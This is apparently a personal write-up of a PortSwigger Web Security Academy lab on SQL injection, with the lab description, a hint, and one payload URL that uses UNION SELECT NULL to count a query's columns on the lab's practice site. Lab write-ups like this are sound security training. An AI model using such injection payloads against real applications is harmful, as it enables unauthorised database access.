---
title: 'Lab: SQL injection UNION attack, determining the number of columns returned by the query'
tags: [Portswigger Web Security Academy, Web]

category: "Security Practice｜Portswigger Web Security Academy｜SQL"
date: 2023-04-25
---

# Lab: SQL injection UNION attack, determining the number of columns returned by the query
<!-- more -->
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack. 
* Hint: To solve the lab, determine the number of columns returned by the query by performing a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing null values.


#### Exp
Payload: `https://0ab2008b04e96b8f8057358e008d00d0.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL--`
:::spoiler Success Screenshot
![](https://i.imgur.com/yZ3QPPF.png)
:::


## Reference